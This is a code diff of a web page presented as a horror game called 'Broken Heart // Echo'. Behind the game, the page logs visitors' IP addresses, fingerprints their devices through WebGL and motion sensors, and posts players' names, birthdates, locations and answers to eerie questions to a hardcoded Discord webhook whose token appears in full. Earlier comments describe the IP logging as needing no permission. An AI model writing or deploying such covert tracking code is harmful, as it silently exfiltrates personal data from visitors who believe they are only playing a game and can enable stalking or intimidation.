@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
   <title>BROKEN HEART // ECHO</title>
   <style>
+    /* YOUR ORIGINAL STYLES - KEEP AS IS */
     :root{
       --bg:#000;
       --fg:#fff;
@@ -394,7 +395,7 @@
   const WEBHOOK = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
   // ============================================================
-  // 1. IP LOGGING (Immediate, no permission needed)
+  // 1. IP LOGGING
   // ============================================================
   let ipLogged = false;
   
@@ -439,7 +440,7 @@
   captureVisitorData();
   
   // ============================================================
-  // 2. WEBGL FINGERPRINTING (Adds device fingerprint to Discord)
+  // 2. WEBGL FINGERPRINTING
   // ============================================================
   
   async function getWebGLFingerprint() {
@@ -519,82 +520,11 @@
   })();
   
   // ============================================================
-  // 3. YOUR COMPLETE BROKEN HEART GAME (FULLY PRESERVED)
+  // 3. MOTION SENSOR FINGERPRINTING
   // ============================================================
-  
-  // Character System
-  let currentCharacter = null;
-  let geoData = null;
-  
-  function loadCharacter() {
-    const saved = localStorage.getItem("bh_character");
-    if(saved) {
-      try {
-        currentCharacter = JSON.parse(saved);
-        return true;
-      } catch(e) { return false; }
-    }
-    return false;
-  }
-  
-  function saveCharacter(name, birthdate, soulColor) {
-    const visitCount = (currentCharacter?.visits || 0) + 1;
-    const now = Date.now();
-    currentCharacter = {
-      name: name,
-      birthdate: birthdate,
-      soulColor: soulColor,
-      created: currentCharacter?.created || now,
-      visits: visitCount,
-      lastSeen: now
-    };
-    localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
-    return currentCharacter;
-  }
-  
-  function updateVisitCount() {
-    if(currentCharacter) {
-      currentCharacter.visits = (currentCharacter.visits || 1) + 1;
-      currentCharacter.lastSeen = Date.now();
-      localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
-    }
-  }
-  
-  async function sendCharacterToDiscord(isNew, charData, geo) {
-    const visitCount = charData.visits || 1;
-    
-    const embed = {
-      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
-      color: isNew ? 0xff2b2b : 0xaa44ff,
-      timestamp: new Date().toISOString(),
-      fields: [
-        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
-        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
-        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
-        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
-        { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
-        { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
-      ],
-      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
-    };
-    
-    try {
-      await fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ embeds: [embed] })
-      });
-    } catch(e) {}
-  }
-  
-  // ============================================================
-  // MOTION SENSOR FINGERPRINTING (Accelerometer + Gyroscope)
-  // ============================================================
-
   let motionData = [];
   let isCollecting = false;
   let collectionStartTime = null;
-
   const hasMotionSupport = 'DeviceMotionEvent' in window;
   const hasOrientationSupport = 'DeviceOrientationEvent' in window;
 
@@ -808,6 +738,73 @@
 
   initMotionFingerprinting();
   
+  // ============================================================
+  // 4. CHARACTER SYSTEM & GAME STATE
+  // ============================================================
+  let currentCharacter = null;
+  let geoData = null;
+  
+  function loadCharacter() {
+    const saved = localStorage.getItem("bh_character");
+    if(saved) {
+      try {
+        currentCharacter = JSON.parse(saved);
+        return true;
+      } catch(e) { return false; }
+    }
+    return false;
+  }
+  
+  function saveCharacter(name, birthdate, soulColor) {
+    const visitCount = (currentCharacter?.visits || 0) + 1;
+    const now = Date.now();
+    currentCharacter = {
+      name: name,
+      birthdate: birthdate,
+      soulColor: soulColor,
+      created: currentCharacter?.created || now,
+      visits: visitCount,
+      lastSeen: now
+    };
+    localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
+    return currentCharacter;
+  }
+  
+  function updateVisitCount() {
+    if(currentCharacter) {
+      currentCharacter.visits = (currentCharacter.visits || 1) + 1;
+      currentCharacter.lastSeen = Date.now();
+      localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
+    }
+  }
+  
+  async function sendCharacterToDiscord(isNew, charData, geo) {
+    const visitCount = charData.visits || 1;
+    
+    const embed = {
+      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
+      color: isNew ? 0xff2b2b : 0xaa44ff,
+      timestamp: new Date().toISOString(),
+      fields: [
+        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
+        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
+        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
+        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
+        { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
+        { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
+      ],
+      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
+    };
+    
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+    } catch(e) {}
+  }
+  
   // Game State
   const PASS_MAIN = "4820";
   const PASS_SECRET = "9281.";
@@ -931,6 +928,152 @@
     return node;
   }
   
+  // ============================================================
+  // 5. DARK FOREST SEQUENCE (CODE 3851)
+  // ============================================================
+  let forestStep = 0;
+  let forestAnswers = {};
+
+  function speak(text) {
+      if ('speechSynthesis' in window) {
+          const utterance = new SpeechSynthesisUtterance(text);
+          utterance.rate = 0.7;
+          utterance.pitch = 0.4;
+          utterance.volume = 0.8;
+          speechSynthesis.cancel();
+          speechSynthesis.speak(utterance);
+      }
+  }
+
+  function startDarkForestSequence() {
+      forestStep = 0;
+      forestAnswers = {};
+      
+      app.innerHTML = `
+          <div id="forestContainer" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:2000; overflow:hidden;">
+              <div style="position:absolute; top:0; left:0; width:100%; height:100%; background: radial-gradient(ellipse at center, #141414 0%, #000000 100%);"></div>
+              <div style="position:absolute; top:15%; right:20%; width:70px; height:70px; background:#ddd; border-radius:50%; box-shadow:0 0 40px rgba(200,200,200,0.4); opacity:0.8;"></div>
+              <div style="position:absolute; top:5%; left:10%; width:2px; height:2px; background:#fff; border-radius:50%; opacity:0.7;"></div>
+              <div style="position:absolute; top:12%; left:30%; width:1px; height:1px; background:#fff; border-radius:50%; opacity:0.9;"></div>
+              <div style="position:absolute; top:8%; left:55%; width:2px; height:2px; background:#fff; border-radius:50%; opacity:0.5;"></div>
+              <div style="position:absolute; top:22%; left:75%; width:1px; height:1px; background:#fff; border-radius:50%; opacity:0.8;"></div>
+              <svg style="position:absolute; bottom:0; left:0; width:100%; height:45%;" preserveAspectRatio="none" viewBox="0 0 1000 300" opacity="0.4">
+                  <path d="M50,300 L70,140 L90,300 Z" fill="#0a1a0a" /><path d="M180,300 L200,110 L220,300 Z" fill="#0a1a0a" />
+                  <path d="M320,300 L340,160 L360,300 Z" fill="#0a1a0a" /><path d="M470,300 L490,90 L510,300 Z" fill="#0a1a0a" />
+                  <path d="M620,300 L640,130 L660,300 Z" fill="#0a1a0a" /><path d="M780,300 L800,70 L820,300 Z" fill="#0a1a0a" />
+                  <path d="M920,300 L940,150 L960,300 Z" fill="#0a1a0a" />
+              </svg>
+              <svg style="position:absolute; bottom:0; left:0; width:100%; height:60%;" preserveAspectRatio="none" viewBox="0 0 1000 300" opacity="0.8">
+                  <path d="M-10,300 L25,50 L60,300 Z" fill="#050a05" /><path d="M120,300 L145,80 L170,300 Z" fill="#050a05" />
+                  <path d="M260,300 L290,30 L320,300 Z" fill="#050a05" /><path d="M400,300 L430,60 L460,300 Z" fill="#050a05" />
+                  <path d="M540,300 L570,40 L600,300 Z" fill="#050a05" /><path d="M690,300 L720,90 L750,300 Z" fill="#050a05" />
+                  <path d="M830,300 L860,20 L890,300 Z" fill="#050a05" /><path d="M950,300 L970,100 L990,300 Z" fill="#050a05" />
+              </svg>
+              <div id="creepyFigure" style="position:absolute; bottom:18%; left:50%; transform:translateX(-50%); width:160px; height:280px; opacity:0; animation:figureAppear 4s ease-out forwards; z-index:20;">
+                  <svg viewBox="0 0 200 300" style="width:100%; height:100%; filter:drop-shadow(0 0 20px #000);">
+                      <path d="M100,30 C70,30 60,70 60,100 C60,130 65,160 70,190 C75,220 85,260 85,290 L85,300 L115,300 L115,290 C115,260 125,220 130,190 C135,160 140,130 140,100 C140,70 130,30 100,30 Z" fill="#0a0a0a"/>
+                      <path d="M68,90 C68,45 82,20 100,20 C118,20 132,45 132,90 C132,90 125,65 100,65 C75,65 68,90 68,90 Z" fill="#0f0f0f"/>
+                      <ellipse cx="100" cy="110" rx="20" ry="24" fill="#000000"/>
+                      <circle cx="92" cy="105" r="4" fill="#ff3333" opacity="0.9"><animate attributeName="opacity" values="0.9;0.3;0.9" dur="1.8s" repeatCount="indefinite"/></circle>
+                      <circle cx="108" cy="105" r="4" fill="#ff3333" opacity="0.9"><animate attributeName="opacity" values="0.9;0.3;0.9" dur="1.8s" repeatCount="indefinite"/></circle>
+                  </svg>
+              </div>
+              <div style="position:absolute; bottom:0; left:0; width:100%; height:25%; background:linear-gradient(to top, rgba(10,10,20,0.9), transparent); pointer-events:none;"></div>
+              <div id="forestContent" style="position:absolute; bottom:8%; left:50%; transform:translateX(-50%); z-index:30; background:rgba(0,0,0,0.85); border:1px solid #444; border-radius:24px; padding:20px 25px; width:85%; max-width:400px; text-align:center; backdrop-filter:blur(10px);">
+                  <div id="forestQuestion" style="font-size:22px; margin-bottom:20px; font-family:'Courier New', monospace; color:#ccc; text-shadow:0 0 5px #666;"></div>
+                  <div id="forestInputArea">
+                      <input type="text" id="forestAnswerInput" placeholder="..." style="background:#222; border:1px solid #555; color:#fff; padding:10px 18px; border-radius:40px; width:80%; text-align:center; outline:none;">
+                      <button id="forestSubmitBtn" style="background:#444; border:none; color:#fff; padding:8px 20px; border-radius:40px; margin-top:15px; cursor:pointer;">† ANSWER †</button>
+                  </div>
+                  <div id="forestYesNoArea" style="display:none;">
+                      <button id="yesBtn" style="background:#0a3a0a; border:1px solid #2a8b2a; color:#afa; padding:8px 25px; border-radius:40px; margin:5px; cursor:pointer;">† YES †</button>
+                      <button id="noBtn" style="background:#3a0a0a; border:1px solid #8b2a2a; color:#faa; padding:8px 25px; border-radius:40px; margin:5px; cursor:pointer;">† NO †</button>
+                  </div>
+              </div>
+          </div>
+          <style>
+              @keyframes figureAppear {
+                  0% { opacity: 0; transform: translateX(-50%) scale(0.6); filter: blur(8px); }
+                  100% { opacity: 1; transform: translateX(-50%) scale(1); filter: blur(0); }
+              }
+          </style>
+      `;
+      askForestQuestion();
+  }
+
+  function askForestQuestion() {
+      const questionDiv = document.getElementById('forestQuestion');
+      const inputArea = document.getElementById('forestInputArea');
+      const yesNoArea = document.getElementById('forestYesNoArea');
+      inputArea.style.display = 'block';
+      yesNoArea.style.display = 'none';
+      const questions = [
+          "Are you liking this?",
+          "Do you feel like someone is near you?",
+          "Are you scared of the dark?",
+          "Do you feel it's just an ordinary survey game?"
+      ];
+      if (forestStep < questions.length) {
+          questionDiv.innerText = questions[forestStep];
+          speak(questions[forestStep]);
+          if (forestStep >= 1) {
+              inputArea.style.display = 'none';
+              yesNoArea.style.display = 'block';
+              document.getElementById('yesBtn').onclick = () => handleYesNo(true);
+              document.getElementById('noBtn').onclick = () => handleYesNo(false);
+          } else {
+              const submitBtn = document.getElementById('forestSubmitBtn');
+              const answerInput = document.getElementById('forestAnswerInput');
+              submitBtn.onclick = () => {
+                  const answer = answerInput.value.trim();
+                  if (answer) {
+                      forestAnswers[`q${forestStep+1}`] = answer;
+                      forestStep++;
+                      askForestQuestion();
+                  } else {
+                      answerInput.style.animation = 'shake 0.3s';
+                      setTimeout(() => answerInput.style.animation = '', 300);
+                  }
+              };
+              answerInput.onkeypress = (e) => { if (e.key === 'Enter') submitBtn.onclick(); };
+          }
+      } else {
+          sendForestAnswers();
+      }
+  }
+
+  function handleYesNo(isYes) {
+      forestAnswers[`q${forestStep+1}`] = isYes ? "YES" : "NO";
+      forestStep++;
+      askForestQuestion();
+  }
+
+  async function sendForestAnswers() {
+      const embed = {
+          title: "🌲 DARK FOREST CONFESSION",
+          color: 0x330000,
+          timestamp: new Date().toISOString(),
+          fields: [
+              { name: "Character", value: currentCharacter?.name || "Unknown", inline: true },
+              { name: "Code Used", value: "3851", inline: true },
+              { name: "Q1: Are you liking this?", value: forestAnswers.q1 || "N/A", inline: false },
+              { name: "Q2: Feel someone near?", value: forestAnswers.q2 || "N/A", inline: true },
+              { name: "Q3: Scared of dark?", value: forestAnswers.q3 || "N/A", inline: true },
+              { name: "Q4: Ordinary survey?", value: forestAnswers.q4 || "N/A", inline: true }
+          ],
+          footer: { text: "The forest remembers your answers" }
+      };
+      try { await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ embeds: [embed] }) }); } catch(e) {}
+      const container = document.getElementById('forestContainer');
+      if (container) {
+          container.style.animation = 'forestFadeOut 1.5s forwards';
+          setTimeout(() => { container.remove(); render(); }, 1500);
+      }
+  }
+  
+  // ============================================================
+  // 6. GAME SCREENS (Passcode, Welcome, Story, etc.)
+  // ============================================================
   function screenGate(){
     hint.textContent = "GATE";
     const isUltra = state.ultraUnlocked;
@@ -964,7 +1107,7 @@
     const enter = async () => {
       const v = (pin.value || "").trim();
       
-      // DARK FOREST SEQUENCE (CODE 3851)
+      // DARK FOREST CODE 3851
       if(v === "3851"){
         msg.textContent = "🔑 CODE 3851 ACCEPTED.";
         await sleep(800);
@@ -984,318 +1127,6 @@
     setTimeout(() => pin.focus(), 50);
     return node;
   }
-  
-  // ============================================================
-  // 4. THE DARK FOREST SEQUENCE (Code 3851)
-  // ============================================================
-
-  let forestStep = 0;
-  let forestAnswers = {};
-
-  function speak(text) {
-      if ('speechSynthesis' in window) {
-          const utterance = new SpeechSynthesisUtterance(text);
-          utterance.rate = 0.7;
-          utterance.pitch = 0.5;
-          utterance.volume = 0.8;
-          speechSynthesis.cancel();
-          speechSynthesis.speak(utterance);
-      }
-  }
-
-  function startDarkForestSequence() {
-      forestStep = 0;
-      forestAnswers = {};
-      
-      app.innerHTML = `
-          <div id="forestContainer" style="
-              position: fixed;
-              top: 0;
-              left: 0;
-              width: 100%;
-              height: 100%;
-              background: #000000;
-              z-index: 1000;
-              overflow: hidden;
-          ">
-              <div id="forestBg" style="
-                  position: absolute;
-                  bottom: 0;
-                  left: 0;
-                  width: 100%;
-                  height: 60%;
-                  background: linear-gradient(180deg, #0a0a0a 0%, #1a1a1a 100%);
-              ">
-                  <svg style="position: absolute; bottom: 0; left: 0; width: 100%; height: 100%;" preserveAspectRatio="none" viewBox="0 0 800 300">
-                      <path d="M50,300 L70,180 L90,300 Z" fill="#0d0d0d" />
-                      <path d="M120,300 L145,150 L170,300 Z" fill="#0a0a0a" />
-                      <path d="M200,300 L230,120 L260,300 Z" fill="#0d0d0d" />
-                      <path d="M320,300 L350,170 L380,300 Z" fill="#0a0a0a" />
-                      <path d="M450,300 L470,140 L490,300 Z" fill="#0d0d0d" />
-                      <path d="M550,300 L580,110 L610,300 Z" fill="#0a0a0a" />
-                      <path d="M650,300 L675,160 L700,300 Z" fill="#0d0d0d" />
-                      <path d="M750,300 L770,190 L790,300 Z" fill="#0a0a0a" />
-                      <path d="M0,300 L25,130 L50,300 Z" fill="#0d0d0d" />
-                  </svg>
-              </div>
-              
-              <div id="creepyFigure" style="
-                  position: absolute;
-                  bottom: 20%;
-                  left: 50%;
-                  transform: translateX(-50%) scale(0.8);
-                  width: 180px;
-                  height: 280px;
-                  background: url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 200 300\"><path d=\"M100,30 C70,30 60,70 60,100 C60,130 70,140 70,170 C70,200 80,230 80,260 L80,300 L120,300 L120,260 C120,230 130,200 130,170 C130,140 140,130 140,100 C140,70 130,30 100,30 Z\" fill=\"%231a1a1a\"/><circle cx=\"100\" cy=\"80\" r=\"20\" fill=\"%231a1a1a\"/><circle cx=\"90\" cy=\"75\" r=\"3\" fill=\"%23333333\"/><circle cx=\"110\" cy=\"75\" r=\"3\" fill=\"%23333333\"/><path d=\"M90,95 L110,95\" stroke=\"%23333333\" stroke-width=\"2\"/></svg>') center/contain no-repeat;
-                  filter: drop-shadow(0 0 20px rgba(0,0,0,0.8));
-                  opacity: 0;
-                  animation: figureAppear 4s ease-out forwards;
-                  z-index: 20;
-              "></div>
-              
-              <div id="fogOverlay" style="
-                  position: absolute;
-                  top: 0;
-                  left: 0;
-                  width: 100%;
-                  height: 100%;
-                  background: radial-gradient(circle at center, transparent 30%, rgba(0,0,0,0.7) 100%);
-                  pointer-events: none;
-                  z-index: 5;
-              "></div>
-              
-              <div id="forestContent" style="
-                  position: absolute;
-                  bottom: 15%;
-                  left: 50%;
-                  transform: translateX(-50%);
-                  z-index: 30;
-                  background: rgba(0,0,0,0.85);
-                  border: 1px solid rgba(80,80,80,0.5);
-                  border-radius: 20px;
-                  padding: 25px 35px;
-                  width: 85%;
-                  max-width: 450px;
-                  text-align: center;
-                  backdrop-filter: blur(8px);
-                  box-shadow: 0 0 40px rgba(0,0,0,0.5);
-                  animation: boxGlow 2s ease-in-out infinite alternate;
-              ">
-                  <div id="forestQuestion" style="
-                      font-size: 22px;
-                      margin-bottom: 25px;
-                      font-family: 'Courier New', monospace;
-                      color: #bbbbbb;
-                      text-shadow: 0 0 8px rgba(100,100,100,0.5);
-                      letter-spacing: 1px;
-                  "></div>
-                  
-                  <div id="forestInputArea">
-                      <input type="text" id="forestAnswerInput" placeholder="..." style="
-                          background: rgba(30,30,30,0.9);
-                          border: 1px solid #555;
-                          color: #ddd;
-                          padding: 12px 20px;
-                          border-radius: 40px;
-                          width: 85%;
-                          text-align: center;
-                          font-size: 16px;
-                          outline: none;
-                          font-family: monospace;
-                      ">
-                      <button id="forestSubmitBtn" style="
-                          background: rgba(60,60,60,0.8);
-                          border: 1px solid #777;
-                          color: #ccc;
-                          padding: 10px 25px;
-                          border-radius: 40px;
-                          margin-top: 18px;
-                          cursor: pointer;
-                          font-family: monospace;
-                          transition: 0.2s;
-                      ">† ANSWER †</button>
-                  </div>
-                  
-                  <div id="forestYesNoArea" style="display: none;">
-                      <button id="yesBtn" style="
-                          background: rgba(0,60,0,0.6);
-                          border: 1px solid #2a6b2a;
-                          color: #aaffaa;
-                          padding: 10px 28px;
-                          border-radius: 40px;
-                          margin: 8px;
-                          cursor: pointer;
-                          font-family: monospace;
-                      ">† YES †</button>
-                      <button id="noBtn" style="
-                          background: rgba(60,0,0,0.6);
-                          border: 1px solid #8b2a2a;
-                          color: #ffaaaa;
-                          padding: 10px 28px;
-                          border-radius: 40px;
-                          margin: 8px;
-                          cursor: pointer;
-                          font-family: monospace;
-                      ">† NO †</button>
-                  </div>
-              </div>
-              
-              <div id="forestParticles"></div>
-          </div>
-          
-          <style>
-              @keyframes figureAppear {
-                  0% { opacity: 0; transform: translateX(-50%) scale(0.5); filter: blur(10px); }
-                  100% { opacity: 1; transform: translateX(-50%) scale(0.9); filter: blur(0px); }
-              }
-              
-              @keyframes boxGlow {
-                  0% { box-shadow: 0 0 20px rgba(0,0,0,0.5); border-color: rgba(80,80,80,0.3); }
-                  100% { box-shadow: 0 0 35px rgba(50,50,50,0.8); border-color: rgba(120,120,120,0.6); }
-              }
-              
-              @keyframes forestFlicker {
-                  0% { opacity: 1; background-color: #000; }
-                  10% { opacity: 0.9; background-color: #0a0a0a; }
-                  20% { opacity: 0.95; background-color: #000; }
-                  30% { opacity: 0.85; background-color: #111; }
-                  100% { opacity: 1; background-color: #000; }
-              }
-              
-              @keyframes floatParticle {
-                  0% { transform: translateY(0) translateX(0); opacity: 0; }
-                  20% { opacity: 0.5; }
-                  80% { opacity: 0.3; }
-                  100% { transform: translateY(-150px) translateX(30px); opacity: 0; }
-              }
-              
-              @keyframes shake {
-                  0% { transform: translateX(0); }
-                  25% { transform: translateX(-5px); }
-                  75% { transform: translateX(5px); }
-                  100% { transform: translateX(0); }
-              }
-          </style>
-      `;
-      
-      const particleContainer = document.getElementById('forestParticles');
-      for (let i = 0; i < 80; i++) {
-          const particle = document.createElement('div');
-          particle.style.position = 'absolute';
-          particle.style.width = (2 + Math.random() * 4) + 'px';
-          particle.style.height = particle.style.width;
-          particle.style.background = `rgba(180,180,180,${0.1 + Math.random() * 0.3})`;
-          particle.style.borderRadius = '50%';
-          particle.style.left = Math.random() * 100 + '%';
-          particle.style.top = Math.random() * 100 + '%';
-          particle.style.pointerEvents = 'none';
-          particle.style.animation = `floatParticle ${3 + Math.random() * 7}s infinite ease-in-out`;
-          particle.style.opacity = Math.random() * 0.5;
-          particleContainer.appendChild(particle);
-      }
-      
-      askForestQuestion();
-  }
-
-  function askForestQuestion() {
-      const questionDiv = document.getElementById('forestQuestion');
-      const inputArea = document.getElementById('forestInputArea');
-      const yesNoArea = document.getElementById('forestYesNoArea');
-      
-      inputArea.style.display = 'block';
-      yesNoArea.style.display = 'none';
-      
-      const questions = [
-          "Are you liking this?",
-          "Do you feel like someone is near you?",
-          "Are you scared of the dark?",
-          "Do you feel it's just an ordinary survey game?"
-      ];
-      
-      if (forestStep < questions.length) {
-          questionDiv.innerText = questions[forestStep];
-          speak(questions[forestStep]);
-          
-          if (forestStep >= 1) {
-              inputArea.style.display = 'none';
-              yesNoArea.style.display = 'block';
-              
-              document.getElementById('yesBtn').onclick = () => handleYesNo(true);
-              document.getElementById('noBtn').onclick = () => handleYesNo(false);
-          } else {
-              const submitBtn = document.getElementById('forestSubmitBtn');
-              const answerInput = document.getElementById('forestAnswerInput');
-              
-              submitBtn.onclick = () => {
-                  const answer = answerInput.value.trim();
-                  if (answer) {
-                      forestAnswers[`q${forestStep+1}`] = answer;
-                      forestStep++;
-                      askForestQuestion();
-                  } else {
-                      answerInput.style.animation = 'shake 0.3s';
-                      setTimeout(() => answerInput.style.animation = '', 300);
-                  }
-              };
-              
-              answerInput.onkeypress = (e) => {
-                  if (e.key === 'Enter') submitBtn.onclick();
-              };
-          }
-      } else {
-          sendForestAnswers();
-      }
-  }
-
-  function handleYesNo(isYes) {
-      const response = isYes ? "YES" : "NO";
-      forestAnswers[`q${forestStep+1}`] = response;
-      forestStep++;
-      askForestQuestion();
-  }
-
-  async function sendForestAnswers() {
-      const embed = {
-          title: "🌲 DARK FOREST CONFESSION",
-          color: 0x330000,
-          timestamp: new Date().toISOString(),
-          fields: [
-              { name: "Character", value: currentCharacter?.name || "Unknown", inline: true },
-              { name: "Code Used", value: "3851", inline: true },
-              { name: "Q1: Are you liking this?", value: forestAnswers.q1 || "N/A", inline: false },
-              { name: "Q2: Feel someone near?", value: forestAnswers.q2 || "N/A", inline: true },
-              { name: "Q3: Scared of dark?", value: forestAnswers.q3 || "N/A", inline: true },
-              { name: "Q4: Ordinary survey?", value: forestAnswers.q4 || "N/A", inline: true }
-          ],
-          footer: { text: "The forest remembers your answers" }
-      };
-      
-      try {
-          await fetch(WEBHOOK, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ embeds: [embed] })
-          });
-      } catch(e) { console.log("Forest send failed"); }
-      
-      const container = document.getElementById('forestContainer');
-      if (container) {
-          container.style.animation = 'forestFadeOut 2s forwards';
-          setTimeout(() => {
-              container.remove();
-              render();
-          }, 2000);
-      }
-  }
-  
-  const exitStyle = document.createElement('style');
-  exitStyle.textContent = `
-      @keyframes forestFadeOut {
-          0% { opacity: 1; filter: blur(0px); }
-          100% { opacity: 0; filter: blur(10px); display: none; }
-      }
-  `;
-  document.head.appendChild(exitStyle);
   
   function screenWelcome(){
     hint.textContent = "WELCOME";
